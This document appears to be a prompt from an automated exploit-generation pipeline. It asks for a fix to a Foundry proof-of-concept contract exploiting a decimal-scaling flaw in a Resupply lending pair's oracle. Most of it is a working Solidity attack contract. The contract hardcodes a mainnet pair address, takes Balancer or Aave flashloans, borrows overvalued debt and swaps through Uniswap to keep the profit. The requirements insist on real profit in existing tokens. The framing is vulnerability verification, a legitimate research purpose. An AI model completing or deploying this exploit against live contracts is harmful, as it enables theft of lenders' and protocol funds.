You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Oracle decimal scaling is ignored, so non-18-decimal feeds misprice collateral by orders of magnitude
- claim: The pair hardcodes exchange-rate inversion as `1e36 / oraclePrice` and never normalizes by `IOracle.decimals()`, even though the oracle interface exposes a decimals field and `setOracle()` accepts arbitrary replacement feeds. Any oracle returning prices in a scale other than 18 decimals will distort the collateral/debt conversion by a power-of-ten factor.
- impact: Borrow, solvency, redemption, and liquidation math can all be wrong by orders of magnitude. Depending on the oracle scale, healthy positions can be liquidated or blocked from withdrawing, or collateral can be overvalued enough for borrowers to mint far more debt than intended, leaving the pair insolvent.
- exploit_paths: ["A pair is deployed with, or later updated to, an oracle whose `getPrices()` output is not 18-decimal scaled.", "`_updateExchangeRate()` computes `exchangeRate = 1e36 / price` without using `IOracle.decimals()`.", "The distorted exchange rate propagates into `_isSolvent()`, borrow limits, redemptions, and liquidations."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC4626Minimal {
    function convertToShares(uint256 assets) external view returns (uint256);
}

interface IOracleMinimal {
    function decimals() external view returns (uint8);
    function getPrices(address vault) external view returns (uint256);
    function name() external view returns (string memory);
}

interface IRegistryMinimal {
    function token() external view returns (address);
}

interface IResupplyPairMinimal {
    function registry() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function maxLTV() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
    function mintFee() external view returns (uint256);
    function minimumBorrowAmount() external view returns (uint256);
    function updateExchangeRate() external returns (uint256);
    function exchangeRateInfo() external view returns (address oracle, uint96 lastTimestamp, uint256 exchangeRate);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function borrow(uint256 borrowAmount, uint256 underlyingAmount, address receiver) external returns (uint256);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAaveFlashLoanSimpleReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface ISwapRouter {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
    function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn);
}

contract FlawVerifier is IFlashLoanRecipient, IAaveFlashLoanSimpleReceiver {
    uint256 private constant LTV_PRECISION = 1e5;
    uint256 private constant LIQ_PRECISION = 1e5;
    uint256 private constant EXCHANGE_PRECISION = 1e18;

    address private constant TARGET_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address private constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address private constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint24[4] private FEE_TIERS = [uint24(100), uint24(500), uint24(3_000), uint24(10_000)];

    enum AttemptMode {
        None,
        Balancer,
        Aave
    }

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;

    string public exploitPathUsed;
    string public status;

    AttemptMode private _mode;
    address private _pair;
    address private _underlying;
    address private _collateral;
    address private _debtToken;
    address private _oracle;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _refreshProfit();
            return;
        }
        executed = true;

        _pair = TARGET_PAIR;
        _collateral = IResupplyPairMinimal(_pair).collateral();
        _underlying = IResupplyPairMinimal(_pair).underlying();
        _debtToken = IRegistryMinimal(IResupplyPairMinimal(_pair).registry()).token();
        _profitToken = _debtToken;

        (_oracle,,) = IResupplyPairMinimal(_pair).exchangeRateInfo();
        uint8 oracleDecimals = IOracleMinimal(_oracle).decimals();

        if (oracleDecimals == 18) {
            hypothesisValidated = false;
            exploitPathUsed = "none";
            status = "refuted_at_fork_current_oracle_is_18_decimals";
            return;
        }

        hypothesisValidated = true;

        // Path stage 1: the pair is already configured with a non-18-decimal oracle at the fork.
        // Path stage 2: force the pair to recompute its flawed `1e36 / price` exchange rate.
        uint256 flawedExchangeRate = IResupplyPairMinimal(_pair).updateExchangeRate();

        if (oracleDecimals < 18) {
            // This direction makes exchangeRate too large, tightening borrow capacity instead of relaxing it.
            // A profitable path would require enumerating third-party borrowers for liquidation, but the pair
            // does not expose a borrower set on-chain and the task forbids off-chain datasets/log pivots.
            exploitPathUsed = "non_18_dec_oracle_detected_but_under_18_decimals_only_create_underpricing";
            status = "validated_bug_but_no_public_profit_path_at_this_fork_without_owner_or_borrower_enumeration";
            return;
        }

        exploitPathUsed =
            "existing_gt_18_decimal_oracle -> flawed_updateExchangeRate -> flashloan_underlying -> borrow_overvalued_debt -> swap_exact_output_to_repay_flashloan";

        uint256 availableDebt = _availableDebt();
        if (availableDebt == 0) {
            status = "validated_bug_but_pair_has_no_available_debt";
            return;
        }

        uint256 maxBorrowFromAvailable =
            availableDebt * LIQ_PRECISION / (LIQ_PRECISION + IResupplyPairMinimal(_pair).mintFee());
        uint256 minimumBorrow = IResupplyPairMinimal(_pair).minimumBorrowAmount();
        if (maxBorrowFromAvailable < minimumBorrow) {
            status = "validated_bug_but_available_debt_below_pair_minimum_borrow";
            return;
        }

        uint256 desiredBorrow = (maxBorrowFromAvailable * 95) / 100;
        if (desiredBorrow < minimumBorrow) {
            desiredBorrow = minimumBorrow;
        }

        uint256 estimatedUnderlying = _estimateUnderlyingForBorrow(desiredBorrow, flawedExchangeRate);
        if (estimatedUnderlying == 0) {
            status = "validated_bug_but_estimated_required_underlying_is_zero";
            return;
        }

        uint256 minUnderlying = _estimateUnderlyingForBorrow(minimumBorrow, flawedExchangeRate);
        if (minUnderlying == 0) {
            minUnderlying = 1;
        }

        if (_tryBalancer(estimatedUnderlying, minUnderlying)) {
            _refreshProfit();
            return;
        }
        if (_tryAave(estimatedUnderlying, minUnderlying)) {
            _refreshProfit();
            return;
        }

        _refreshProfit();
        if (_profitAmount == 0) {
            status = "validated_bug_but_no_supported_flashloan_plus_swap_route_was_profitable_on_fork";
        }
    }

    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "balancer_only");
        require(_mode == AttemptMode.Balancer, "mode");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "len");
        require(address(tokens[0]) == _underlying, "asset");

        _executeBorrowAndRepay(amounts[0], feeAmounts[0], AttemptMode.Balancer);

        _safeTransfer(_underlying, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external override returns (bool) {
        require(msg.sender == AAVE_V3_POOL, "aave_only");
        require(_mode == AttemptMode.Aave, "mode");
        require(initiator == address(this), "initiator");
        require(asset == _underlying, "asset");

        _executeBorrowAndRepay(amount, premium, AttemptMode.Aave);
        _forceApprove(_underlying, AAVE_V3_POOL, amount + premium);
        return true;
    }

    function _tryBalancer(uint256 estimatedUnderlying, uint256 minUnderlying) internal returns (bool) {
        uint256 liquidity = IERC20Minimal(_underlying).balanceOf(BALANCER_VAULT);
        if (liquidity < minUnderlying) {
            return false;
        }

        uint256[4] memory attempts = _candidateFlashAmounts(estimatedUnderlying, minUnderlying, liquidity);
        IERC20Minimal[] memory tokens = new IERC20Minimal[](1);
        tokens[0] = IERC20Minimal(_underlying);

        for (uint256 i = 0; i < attempts.length; i++) {
            uint256 amount = attempts[i];
            if (amount == 0) continue;
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = amount;
            _mode = AttemptMode.Balancer;
            try IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes("")) {
                _mode = AttemptMode.None;
                return _profitAmount > 0;
            } catch {
                _mode = AttemptMode.None;
            }
        }
        return false;
    }

    function _tryAave(uint256 estimatedUnderlying, uint256 minUnderlying) internal returns (bool) {
        uint256[4] memory attempts = _candidateFlashAmounts(
            estimatedUnderlying,
            minUnderlying,
            estimatedUnderlying > minUnderlying ? estimatedUnderlying : minUnderlying
        );
        for (uint256 i = 0; i < attempts.length; i++) {
            uint256 amount = attempts[i];
            if (amount == 0) continue;
            _mode = AttemptMode.Aave;
            try IAavePool(AAVE_V3_POOL).flashLoanSimple(address(this), _underlying, amount, bytes(""), 0) {
                _mode = AttemptMode.None;
                return _profitAmount > 0;
            } catch {
                _mode = AttemptMode.None;
            }
        }
        return false;
    }

    function _executeBorrowAndRepay(uint256 flashAmount, uint256 flashFee, AttemptMode mode) internal {
        uint256 exchangeRate = IResupplyPairMinimal(_pair).updateExchangeRate();
        uint256 maxBorrow = _maxBorrowAgainstUnderlying(flashAmount, exchangeRate);
        uint256 minimumBorrow = IResupplyPairMinimal(_pair).minimumBorrowAmount();
        require(maxBorrow >= minimumBorrow, "min_borrow_not_reachable");

        uint256 availableDebt = _availableDebt();
        uint256 capFromAvailable = availableDebt * LIQ_PRECISION / (LIQ_PRECISION + IResupplyPairMinimal(_pair).mintFee());
        if (maxBorrow > capFromAvailable) {
            maxBorrow = capFromAvailable;
        }
        require(maxBorrow >= minimumBorrow, "debt_unavailable");

        uint256 borrowAmount = (maxBorrow * 99) / 100;
        if (borrowAmount < minimumBorrow) {
            borrowAmount = minimumBorrow;
        }

        _forceApprove(_underlying, _pair, flashAmount);
        IResupplyPairMinimal(_pair).borrow(borrowAmount, flashAmount, address(this));

        uint256 repayAmount = flashAmount + flashFee;
        if (_underlying == _debtToken) {
            require(IERC20Minimal(_debtToken).balanceOf(address(this)) >= repayAmount, "same_asset_no_profit");
        } else {
            uint256 debtBal = IERC20Minimal(_debtToken).balanceOf(address(this));
            require(debtBal > 0, "no_debt_minted");
            _forceApprove(_debtToken, UNISWAP_V3_ROUTER, debtBal);
            uint256 amountIn = _swapDebtForExactUnderlying(repayAmount, debtBal);
            require(amountIn < debtBal, "swap_not_profitable");
        }

        if (mode == AttemptMode.Balancer) {
            require(IERC20Minimal(_underlying).balanceOf(address(this)) >= repayAmount, "balancer_repay_shortfall");
        } else {
            require(IERC20Minimal(_underlying).balanceOf(address(this)) >= repayAmount, "aave_repay_shortfall");
        }

        uint256 netProfit = IERC20Minimal(_debtToken).balanceOf(address(this));
        if (_underlying == _debtToken) {
            require(netProfit > repayAmount, "no_net_profit");
            netProfit -= repayAmount;
        }
        _profitAmount = netProfit;
        require(_profitAmount > 0, "no_net_profit");
        profitAchieved = true;
        status = "profit_achieved";
    }

    function _swapDebtForExactUnderlying(uint256 amountOut, uint256 amountInMaximum) internal returns (uint256) {
        uint256 direct = _tryDirectExactOutput(amountOut, amountInMaximum);
        if (direct != type(uint256).max) {
            return direct;
        }

        address[4] memory bridges = [WETH, USDC, USDT, DAI];
        for (uint256 i = 0; i < bridges.length; i++) {
            address bridge = bridges[i];
            if (bridge == _debtToken || bridge == _underlying) continue;
            uint256 bridged = _tryTwoHopExactOutput(bridge, amountOut, amountInMaximum);
            if (bridged != type(uint256).max) {
                return bridged;
            }
        }

        revert("no_swap_path");
    }

    function _tryDirectExactOutput(uint256 amountOut, uint256 amountInMaximum) internal returns (uint256) {
        for (uint256 i = 0; i < FEE_TIERS.length; i++) {
            uint24 fee = FEE_TIERS[i];
            if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(_debtToken, _underlying, fee) == address(0)) {
                continue;
            }
            try ISwapRouter(UNISWAP_V3_ROUTER).exactOutputSingle(
                ISwapRouter.ExactOutputSingleParams({
                    tokenIn: _debtToken,
                    tokenOut: _underlying,
                    fee: fee,
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountOut: amountOut,
                    amountInMaximum: amountInMaximum,
                    sqrtPriceLimitX96: 0
                })
            ) returns (uint256 amountIn) {
                return amountIn;
            } catch {}
        }
        return type(uint256).max;
    }

    function _tryTwoHopExactOutput(address bridge, uint256 amountOut, uint256 amountInMaximum) internal returns (uint256) {
        for (uint256 i = 0; i < FEE_TIERS.length; i++) {
            uint24 feeOut = FEE_TIERS[i];
            if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(_underlying, bridge, feeOut) == address(0)) {
                continue;
            }
            for (uint256 j = 0; j < FEE_TIERS.length; j++) {
                uint24 feeIn = FEE_TIERS[j];
                if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(_debtToken, bridge, feeIn) == address(0)) {
                    continue;
                }
                bytes memory path = abi.encodePacked(_underlying, feeOut, bridge, feeIn, _debtToken);
                try ISwapRouter(UNISWAP_V3_ROUTER).exactOutput(
                    ISwapRouter.ExactOutputParams({
                        path: path,
                        recipient: address(this),
                        deadline: block.timestamp,
                        amountOut: amountOut,
                        amountInMaximum: amountInMaximum
                    })
                ) returns (uint256 amountIn) {
                    return amountIn;
                } catch {}
            }
        }
        return type(uint256).max;
    }

    function _availableDebt() internal view returns (uint256) {
        (uint128 amount,) = IResupplyPairMinimal(_pair).totalBorrow();
        uint256 borrowLimit = IResupplyPairMinimal(_pair).borrowLimit();
        return borrowLimit > amount ? borrowLimit - amount : 0;
    }

    function _estimateUnderlyingForBorrow(uint256 borrowAmount, uint256 exchangeRate) internal view returns (uint256) {
        uint256 maxLTV = IResupplyPairMinimal(_pair).maxLTV();
        if (maxLTV == 0 || exchangeRate == 0) {
            return 1;
        }

        uint256 guess = (borrowAmount * exchangeRate * LTV_PRECISION) / (maxLTV * EXCHANGE_PRECISION);
        if (guess == 0) {
            guess = 1;
        }

        for (uint256 i = 0; i < 3; i++) {
            uint256 capacity = _maxBorrowAgainstUnderlying(guess, exchangeRate);
            if (capacity >= borrowAmount) {
                break;
            }
            if (capacity == 0) {
                guess *= 10;
            } else {
                guess = (guess * borrowAmount) / capacity;
                guess = (guess * 105) / 100 + 1;
            }
        }
        return guess;
    }

    function _maxBorrowAgainstUnderlying(uint256 underlyingAmount, uint256 exchangeRate) internal view returns (uint256) {
        if (exchangeRate == 0) {
            return type(uint256).max;
        }
        uint256 shares = IERC4626Minimal(_collateral).convertToShares(underlyingAmount);
        return (shares * IResupplyPairMinimal(_pair).maxLTV() * EXCHANGE_PRECISION) / exchangeRate / LTV_PRECISION;
    }

    function _candidateFlashAmounts(uint256 estimated, uint256 minimum, uint256 liquidity)
        internal
        pure
        returns (uint256[4] memory amounts)
    {
        uint256 first = estimated;
        if (first > liquidity) first = liquidity;
        uint256 second = first / 2;
        uint256 third = first / 4;
        uint256 fourth = minimum;

        if (first < minimum) first = minimum;
        if (second < minimum) second = minimum;
        if (third < minimum) third = minimum;
        if (fourth > liquidity) fourth = liquidity;

        if (first > liquidity) first = 0;
        if (second > liquidity) second = 0;
        if (third > liquidity) third = 0;
        if (fourth < minimum || fourth > liquidity) fourth = 0;

        amounts[0] = first;
        amounts[1] = second;
        amounts[2] = third;
        amounts[3] = fourth;
    }

    function _refreshProfit() internal {
        uint256 debtBal = _debtToken == address(0) ? 0 : IERC20Minimal(_debtToken).balanceOf(address(this));
        _profitAmount = debtBal;
        profitAchieved = debtBal > 0;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0));
        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve0");
        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: getprices(), _updateexchangerate(), exchangerate = 1e36 / price, ioracle.decimals(), _issolvent(); generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
